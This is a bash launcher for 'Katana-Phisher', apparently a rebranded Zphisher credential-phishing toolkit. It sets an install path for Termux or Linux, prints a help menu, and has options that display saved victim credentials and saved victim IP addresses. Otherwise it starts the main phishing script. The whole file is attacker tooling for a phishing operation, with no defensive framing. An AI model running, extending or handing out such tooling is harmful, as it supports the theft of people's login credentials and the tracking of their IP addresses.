#!/bin/bash


if [[ $(uname -o) == *'Android'* ]];then
	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/katana_phisher"
else
	export ZPHISHER_ROOT="/opt/katana_phisher"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Katana-Phisher type \`katana_phisher\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ZPHISHER_ROOT
	bash ./katana_phisher.sh
fi
